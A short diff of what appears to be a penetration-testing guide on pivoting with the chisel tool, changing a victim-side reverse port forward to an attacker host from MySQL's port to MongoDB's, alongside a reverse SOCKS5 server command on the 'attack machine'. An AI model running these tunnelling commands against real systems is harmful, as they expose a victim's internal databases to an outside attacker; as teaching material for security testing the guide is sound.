@@ -12,7 +12,7 @@ chisel server -p 3477 --reverse
 
 ## On the Victim Machine
 
-chisel client 13.37.13.37:3477 R:2222:127.0.0.1:3306/tcp
+chisel client 13.37.13.37:3477 R:2222:127.0.0.1:27017/tcp
 
 -   `client` : run the client mode
 -   `13.37.13.37:3477` : the IP address of the attacker’s machine and the port that was specified in the `chisel server` command
@@ -29,6 +29,7 @@ SOCKS proxies capabilities was a recent addition to `chisels` capabilities which
 ## On the Attack Machine
 
 chisel server -p 3477 --socks5 --reverse
+
 
 -   `-p`: port for the server to listen on
 -   `--socks5`: start an internal SOCKS5 proxy
